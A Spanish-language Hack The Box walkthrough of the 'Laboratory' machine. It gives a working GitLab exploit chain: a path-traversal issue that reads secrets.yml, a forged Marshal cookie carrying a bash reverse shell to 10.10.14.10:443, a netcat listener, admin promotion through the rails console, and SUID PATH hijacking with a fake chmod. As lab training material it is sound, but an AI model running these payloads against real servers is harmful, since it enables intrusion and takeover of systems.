---
title: "Laboratory"
description: "Laboratory"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/298

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.10.216
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241211104912.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80,443 10.10.10.216
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241211105026.png)

## Fuzz

Podemos observar en el certificado, que existe otra pagina llamada git.laboratory.htb
Añadir a /etc/hosts

En gitlab puede saber la versión dirigiéndote a /help

# Fase de ataque

## Arbitrary File Read + RCE

https://hackerone.com/reports/827052

1. Nos creamos 2 projectos
1. Creamos 1 issue en uno con el siguiente contenido

````
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
````

3. Movemos el issue al otro projecto
3. Leemos en los secrets.yml y vemos el secret_key_base
3. Creamos una maquina gitlab en la misma version
3. Añadimos el secret_key_base en nuestra maquina
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241211114049.png)
3. Ejeuctamos gitlab-rails console
3. Lanzamos los siguintes comandos

````
request = ActionDispatch::Request.new(Rails.application.env_config) 

request.env["action_dispatch.cookies_serializer"] = :marshal 

cookies = request.cookie_jar
````

````
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'` %>")
````

````
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new) 

cookies.signed[:cookie] = depr 

puts cookies[:cookie]

````

9. Con la cookie que te da mandas un curl a la maquina a realizar el RCE

````
curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwLzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--77c074496cf2ddc72eab9eed1350b23cc8c5a874"
````

10. Nos ponemos en escucha

````
nc -nlvp 443
````

\[-\] ==pwned!==

````
script /dev/null -c bash
````

ctrl+z

````
stty raw -echo; fg
	reset xterm
````

````
export TERM=xterm
export SHELL=/bin/bash
````

# Privilege Escalation

## Exit docker container

1. Desde la maquina victima  lanzamos una consola de gitlab

````
gitlab-rails console -e production
````

2. Cambiamos los permisos de nuestro usuario

````
user = User.find_by(username: 'prueba')

user.admin = true 

user.save!
````

3. Hay un repositorio privado del admin con las claves ssh

Entramos en la maquina real con el usuario dexter

## Escalation

Buscamos privilegios

````
find \-perm -4000 2>/dev/null
````

Miramos lo que hace el binario docker-security

````
ltrace docker-security
````

## Path Hijacking

Vemos que lo que hace es un chmod pero sin usar la ruta por lo que podemos cambiar la ruta del chmod para nuestro gusto

Creamos un binario llamado chmod

````
touch chmod
````

Permiso de ejecucion

````
chmod +x chmod
````

nano chmod

````
#!/bin/bash
/bin/sh
````

Modificamos el PATH

````
export PATH=/tmp:$PATH
````

Ejecutamos el docker-security
\[+\] ==pwned!==
